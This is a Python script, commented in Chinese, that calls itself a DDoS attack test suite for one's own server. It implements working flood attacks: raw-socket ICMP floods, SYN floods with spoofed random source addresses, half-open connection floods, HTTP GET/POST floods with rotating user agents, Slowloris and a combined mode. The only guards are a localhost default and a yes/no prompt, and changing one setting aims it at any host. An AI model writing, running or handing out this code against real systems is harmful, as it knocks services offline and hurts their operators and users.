
"""
DDoS 攻擊測試套件
包含多種攻擊方式，僅用於測試自己的伺服器
"""
import socket
import threading
import time
import random
import requests
import struct
import sys
from collections import Counter

# ===== 配置區 =====
TARGET_IP = "127.0.0.1"
TARGET_PORT = 8000
THREAD_COUNT = 20
DURATION = 30  # 秒
# ==================

class AttackStats:
    """統計資訊"""
    def __init__(self):
        self.packets_sent = 0
        self.connections_made = 0
        self.requests_sent = 0
        self.errors = Counter()
        self.lock = threading.Lock()
    
    def increment(self, metric, value=1):
        with self.lock:
            if metric == "packets":
                self.packets_sent += value
            elif metric == "connections":
                self.connections_made += value
            elif metric == "requests":
                self.requests_sent += value
    
    def add_error(self, error_type):
        with self.lock:
            self.errors[error_type] += 1
    
    def get_stats(self):
        with self.lock:
            return {
                'packets': self.packets_sent,
                'connections': self.connections_made,
                'requests': self.requests_sent,
                'errors': dict(self.errors)
            }

stats = AttackStats()
running = False

# ==================== 1. ICMP Flood ====================
class ICMPFlood:
    """ICMP Flood 攻擊（需要 root/admin 權限）"""
    
    @staticmethod
    def checksum(data):
        """計算 ICMP 校驗和"""
        s = 0
        n = len(data) % 2
        for i in range(0, len(data) - n, 2):
            s += (data[i] << 8) + data[i + 1]
        if n:
            s += data[-1] << 8
        while s >> 16:
            s = (s & 0xFFFF) + (s >> 16)
        s = ~s & 0xFFFF
        return s
    
    @staticmethod
    def create_icmp_packet():
        """創建 ICMP Echo Request 封包"""
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = random.randint(1, 65535)
        
        # 封包標頭
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        data = b'A' * 56  # 資料部分
        
        # 計算校驗和
        icmp_checksum = ICMPFlood.checksum(header + data)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        return header + data
    
    @staticmethod
    def attack(target_ip, duration):
        """執行 ICMP Flood"""
        global running
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print("❌ ICMP Flood 需要 root/管理員權限")
            print("💡 Linux/Mac: sudo python3 script.py")
            print("💡 Windows: 以管理員身份執行")
            return
        
        print(f"🔵 ICMP Flood 已啟動 → {target_ip}")
        
        while running:
            try:
                packet = ICMPFlood.create_icmp_packet()
                sock.sendto(packet, (target_ip, 0))
                stats.increment("packets")
            except Exception as e:
                stats.add_error(f"ICMP: {type(e).__name__}")
        
        sock.close()

# ==================== 2. SYN Flood ====================
class SYNFlood:
    """SYN Flood 攻擊（需要 root/admin 權限）"""
    
    @staticmethod
    def create_ip_header(source_ip, dest_ip):
        """創建 IP 標頭"""
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel 會填充
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl,
                                ip_proto, ip_check, ip_saddr, ip_daddr)
        return ip_header
    
    @staticmethod
    def create_tcp_syn(source_ip, source_port, dest_ip, dest_port):
        """創建 TCP SYN 封包"""
        tcp_source = source_port
        tcp_dest = dest_port
        tcp_seq = random.randint(1, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
        
        # TCP flags
        tcp_fin = 0
        tcp_syn = 1  # SYN flag
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags, tcp_window,
                                 tcp_check, tcp_urg_ptr)
        
        # 偽標頭用於計算校驗和
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_check = SYNFlood.checksum(psh)
        
        tcp_header = struct.pack('!HHLLBBH',
                                 tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags, tcp_window) + \
                     struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
        
        return tcp_header
    
    @staticmethod
    def checksum(msg):
        """計算校驗和"""
        s = 0
        for i in range(0, len(msg), 2):
            if i + 1 < len(msg):
                w = (msg[i] << 8) + msg[i + 1]
            else:
                w = msg[i] << 8
            s = s + w
        
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """執行 SYN Flood"""
        global running
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print("❌ SYN Flood 需要 root/管理員權限")
            print("💡 請改用 SYN Flood (簡化版)")
            return
        
        print(f"🔴 SYN Flood 已啟動 → {target_ip}:{target_port}")
        
        while running:
            try:
                # 隨機源 IP 和端口
                source_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                source_port = random.randint(1024, 65535)
                
                ip_header = SYNFlood.create_ip_header(source_ip, target_ip)
                tcp_header = SYNFlood.create_tcp_syn(source_ip, source_port, target_ip, target_port)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (target_ip, 0))
                stats.increment("packets")
            except Exception as e:
                stats.add_error(f"SYN: {type(e).__name__}")
        
        sock.close()

# ==================== 3. SYN Flood (簡化版) ====================
class SYNFloodSimple:
    """SYN Flood 簡化版（不需要 root 權限）"""
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """
        簡化版 SYN Flood
        通過快速創建和丟棄連接來模擬 SYN Flood 效果
        """
        global running
        print(f"🟡 SYN Flood (簡化版) 已啟動 → {target_ip}:{target_port}")
        
        while running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)  # 極短超時
                sock.setblocking(False)
                
                try:
                    sock.connect((target_ip, target_port))
                except (BlockingIOError, socket.error):
                    # 預期的錯誤，連接尚未完成
                    pass
                
                stats.increment("connections")
                # 不關閉 socket，讓它保持半開狀態
                # sock.close()  # 故意不關閉
                
            except Exception as e:
                stats.add_error(f"SYN-Simple: {type(e).__name__}")

# ==================== 4. HTTP Request Flood ====================
class HTTPFlood:
    """HTTP Request Flood（最有效）"""
    
    @staticmethod
    def attack(target_url, method="GET", duration=30):
        """執行 HTTP Flood"""
        global running
        print(f"🟢 HTTP {method} Flood 已啟動 → {target_url}")
        
        session = requests.Session()
        
        paths = ["/", "/api", "/search", "/login", "/data", "/admin"]
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
        ]
        
        while running:
            try:
                url = target_url + random.choice(paths)
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                }
                
                if method == "GET":
                    response = session.get(url, headers=headers, timeout=2)
                elif method == "POST":
                    data = {"test": random.randint(1, 10000)}
                    response = session.post(url, json=data, headers=headers, timeout=2)
                
                stats.increment("requests")
                
            except requests.exceptions.Timeout:
                stats.add_error("HTTP Timeout")
            except requests.exceptions.ConnectionError:
                stats.add_error("HTTP Connection Error")
            except Exception as e:
                stats.add_error(f"HTTP: {type(e).__name__}")

# ==================== 5. Slowloris 攻擊 ====================
class Slowloris:
    """Slowloris 慢速攻擊（消耗連接資源）"""
    
    @staticmethod
    def attack(target_ip, target_port, duration):
        """執行 Slowloris 攻擊"""
        global running
        print(f"🟣 Slowloris 已啟動 → {target_ip}:{target_port}")
        
        sockets = []
        
        # 創建大量半完成的 HTTP 請求
        for _ in range(200):
            if not running:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                
                # 發送不完整的 HTTP 請求
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                
                sockets.append(sock)
                stats.increment("connections")
            except:
                pass
        
        print(f"  已建立 {len(sockets)} 個連接")
        
        # 持續發送不完整的標頭來保持連接
        while running:
            try:
                for sock in list(sockets):
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        stats.increment("packets")
                    except:
                        sockets.remove(sock)
                
                time.sleep(10)  # 每 10 秒發送一次
                
            except Exception as e:
                stats.add_error(f"Slowloris: {type(e).__name__}")
        
        # 清理
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

# ==================== 主程式 ====================
def print_stats_loop(start_time):
    """持續顯示統計資訊"""
    global running
    while running:
        elapsed = time.time() - start_time
        current_stats = stats.get_stats()
        
        sys.stdout.write("\r" + " " * 150 + "\r")
        sys.stdout.write(
            f"⚡ 封包: {current_stats['packets']:,} | "
            f"連接: {current_stats['connections']:,} | "
            f"請求: {current_stats['requests']:,} | "
            f"時間: {elapsed:.1f}s"
        )
        sys.stdout.flush()
        
        time.sleep(0.5)

def run_attack_suite():
    """執行攻擊測試套件"""
    global running
    
    print("="*80)
    print("💣 DDoS 攻擊測試套件")
    print("="*80)
    print("選擇攻擊類型:")
    print("1. ICMP Flood (需要 root 權限) - ⚠️ 消耗網路頻寬")
    print("2. SYN Flood (需要 root 權限) - ✅ 耗盡 TCP 連接")
    print("3. SYN Flood 簡化版 (無需 root) - ✅ 半開連接攻擊")
    print("4. HTTP GET Flood - ✅ 應用層攻擊")
    print("5. HTTP POST Flood - ✅ 應用層攻擊")
    print("6. Slowloris 慢速攻擊 - ✅ 連接耗盡")
    print("7. 組合攻擊 (3+4+6) - 🔥 最強效果")
    print("="*80)
    
    choice = input("選擇攻擊類型 (1-7): ").strip()
    
    confirm = input(f"\n⚠️  目標: {TARGET_IP}:{TARGET_PORT}\n⚠️  請確認這是你自己的伺服器 (yes/no): ")
    if confirm.lower() != "yes":
        print("❌ 測試已取消")
        return
    
    print(f"\n🚀 啟動攻擊... (持續 {DURATION} 秒)\n")
    
    running = True
    threads = []
    start_time = time.time()
    
    # 啟動統計顯示執行緒
    stats_thread = threading.Thread(target=print_stats_loop, args=(start_time,), daemon=True)
    stats_thread.start()
    
    if choice == "1":
        # ICMP Flood
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=ICMPFlood.attack, args=(TARGET_IP, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "2":
        # SYN Flood
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=SYNFlood.attack, args=(TARGET_IP, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "3":
        # SYN Flood 簡化版
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=SYNFloodSimple.attack, args=(TARGET_IP, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "4":
        # HTTP GET Flood
        target_url = f"http://{TARGET_IP}:{TARGET_PORT}"
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "GET", DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "5":
        # HTTP POST Flood
        target_url = f"http://{TARGET_IP}:{TARGET_PORT}"
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "POST", DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "6":
        # Slowloris
        for _ in range(5):  # 少量執行緒即可
            t = threading.Thread(target=Slowloris.attack, args=(TARGET_IP, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    elif choice == "7":
        # 組合攻擊
        print("🔥 啟動組合攻擊:")
        
        # SYN Flood 簡化版
        for _ in range(THREAD_COUNT // 3):
            t = threading.Thread(target=SYNFloodSimple.attack, args=(TARGET_IP, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
        
        # HTTP Flood
        target_url = f"http://{TARGET_IP}:{TARGET_PORT}"
        for _ in range(THREAD_COUNT // 3):
            t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "GET", DURATION), daemon=True)
            t.start()
            threads.append(t)
        
        # Slowloris
        for _ in range(3):
            t = threading.Thread(target=Slowloris.attack, args=(TARGET_IP, TARGET_PORT, DURATION), daemon=True)
            t.start()
            threads.append(t)
    
    else:
        print("❌ 無效選擇")
        running = False
        return
    
    # 等待指定時間或 Ctrl+C
    try:
        time.sleep(DURATION)
    except KeyboardInterrupt:
        print("\n\n⏹️  收到中斷信號...")
    
    running = False
    elapsed = time.time() - start_time
    
    # 等待執行緒結束
    for t in threads:
        t.join(timeout=1)
    
    # 最終統計
    final_stats = stats.get_stats()
    print("\n\n" + "="*80)
    print("📊 攻擊測試完成")
    print("="*80)
    print(f"執行時間: {elapsed:.2f} 秒")
    print(f"發送封包: {final_stats['packets']:,}")
    print(f"建立連接: {final_stats['connections']:,}")
    print(f"HTTP 請求: {final_stats['requests']:,}")
    
    if final_stats['errors']:
        print(f"\n錯誤統計:")
        for error, count in final_stats['errors'].most_common(5):
            print(f"  {error}: {count:,}")
    
    print("="*80)

if __name__ == "__main__":
    run_attack_suite()